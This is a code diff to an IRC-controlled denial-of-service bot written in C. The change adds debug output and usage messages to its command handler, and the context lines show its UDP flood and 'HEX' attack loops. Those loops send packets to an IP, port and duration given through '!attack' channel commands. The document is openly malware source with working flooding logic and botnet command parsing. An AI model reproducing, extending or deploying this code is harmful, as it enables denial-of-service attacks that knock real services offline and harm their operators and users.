@@ -56,6 +56,8 @@ void *udp_flood_thread(void *arg) {
     addr.sin_port = htons(port);
     inet_pton(AF_INET, host, &addr.sin_addr);
 
+    printf("Starting UDP flood to %s:%d for %d seconds...\n", host, port, timeout);  // Debugging output
+
     time_t end_time = time(NULL) + timeout;
     while (time(NULL) < end_time) {
         sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr));
@@ -98,6 +100,8 @@ void attack_hex(const char *host, int port, int duration) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     inet_pton(AF_INET, host, &addr.sin_addr);
+
+    printf("Starting HEX attack to %s:%d for %d seconds...\n", host, port, duration);  // Debugging output
 
     time_t end_time = time(NULL) + duration;
     while (time(NULL) < end_time) {
@@ -172,12 +176,18 @@ int main() {
             if (sscanf(recv_buffer, "!attack HEX %15s %d %d", ip, &port, &duration) == 3) {
                 // Call the HEX attack function
                 attack_hex(ip, port, duration);
+            } else {
+                // Send usage instructions to the channel if command parameters are invalid
+                send_data(sockfd, "PRIVMSG %s :Usage: !attack HEX <ip> <port> <duration>\r\n", CHANNEL);
             }
         } else if (strstr(recv_buffer, "!attack UDPFLOOD") != NULL) {
             // Extract the command parameters
             if (sscanf(recv_buffer, "!attack UDPFLOOD %15s %d %d", ip, &port, &duration) == 3) {
                 // Call the UDP flood manager for UDPFLOOD attacks
                 udp_flood_manager(ip, port, duration, NUM_THREADS);
+            } else {
+                // Send usage instructions to the channel if command parameters are invalid
+                send_data(sockfd, "PRIVMSG %s :Usage: !attack UDPFLOOD <ip> <port> <duration>\r\n", CHANNEL);
             }
         }
 
